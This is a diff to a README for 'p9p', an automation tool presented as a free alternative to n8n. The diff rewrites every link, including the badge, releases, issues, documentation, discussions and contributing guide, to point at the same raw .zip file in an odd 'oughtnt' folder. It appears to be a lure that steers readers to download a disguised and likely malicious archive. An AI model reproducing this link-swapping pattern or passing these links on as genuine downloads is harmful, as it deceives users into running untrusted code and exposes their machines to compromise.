@@ -1,6 +1,6 @@
 # 🎉 p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal - Free Automation, No Strings Attached
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download Now](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip%20Now-Get%20Started-brightgreen)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ To run p9p, your system should meet the following requirements:
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
-   To download p9p, go to our [Releases page](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/releases).
+   To download p9p, go to our [Releases page](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip).
 
 2. **Download the Latest Version**  
    Find the latest version available and click on the link to download.  
@@ -40,7 +40,7 @@ To run p9p, your system should meet the following requirements:
 
 ## 📥 Download & Install
 
-To get started, **visit the [Releases page](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/releases)**. Here, you can find the most recent version of p9p. Simply click the appropriate link to download the software to your computer.
+To get started, **visit the [Releases page](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip)**. Here, you can find the most recent version of p9p. Simply click the appropriate link to download the software to your computer.
 
 You will see options for multiple platforms. Select the correct one based on your operating system. For Windows users, the file usually ends with .exe, while macOS users will see a .dmg file.
 
@@ -62,25 +62,25 @@ Yes, you can run p9p offline once you have completed the setup. Some functionali
 
 ### How Do I Report an Issue?
 
-If you encounter any problems, please visit our [Issues section](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/issues) on GitHub. Create a new issue and describe the problem clearly, along with any relevant details.
+If you encounter any problems, please visit our [Issues section](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip) on GitHub. Create a new issue and describe the problem clearly, along with any relevant details.
 
 ### Where Can I Find Help?
 
-You can find help in the ‘Help’ section of the application, or visit our [Documentation](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/wiki) for more resources.
+You can find help in the ‘Help’ section of the application, or visit our [Documentation](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip) for more resources.
 
 ### Is There a Community Forum?
 
-Join the community and engage with other users on our [Discussion Board](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/discussions). Share ideas, ask questions, and collaborate on projects.
+Join the community and engage with other users on our [Discussion Board](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip). Share ideas, ask questions, and collaborate on projects.
 
 ## 🌟 Community and Contributions
 
-We welcome contributions from everyone. If you want to improve p9p or add features, check out our [Contributing Guidelines](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/blob/main/CONTRIBUTING.md).
+We welcome contributions from everyone. If you want to improve p9p or add features, check out our [Contributing Guidelines](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip).
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/releases)
-- [Documentation](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/wiki)
-- [Issues Section](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/issues)
-- [Discussion Board](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/discussions)
+- [Releases Page](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip)
+- [Documentation](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip)
+- [Issues Section](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip)
+- [Discussion Board](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip)
 
-Visit the [Releases page](https://github.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/releases) again to check for updates and new features as they become available. Enjoy using p9p!
+Visit the [Releases page](https://raw.githubusercontent.com/hardtarget08/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal/main/oughtnt/p9p-Pipeline-9-Platform-Open-Source-Automation-Alternative-to-n8n-Free-Forever-No-Betrayal.zip) again to check for updates and new features as they become available. Enjoy using p9p!
